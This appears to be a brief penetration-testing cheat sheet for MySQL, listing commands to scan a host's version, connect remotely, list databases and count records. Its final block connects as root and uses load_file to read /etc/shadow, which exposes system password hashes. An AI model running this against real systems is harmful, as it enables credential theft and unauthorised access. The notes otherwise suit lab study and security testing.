##### MySQL Version
```
nmap -sV IP
```

##### Connect to Remote MySQL Database
```
mysql -h IP -u username
```

##### Check the Databases
```
show databases;
```

##### Count Records in Table 'Authors' inside Books
```
use books;
select count(*) from authors;
```

##### System Password Hash for user 'root'
```
mysql -h IP -u root
select load_file("/etc/shadow");
```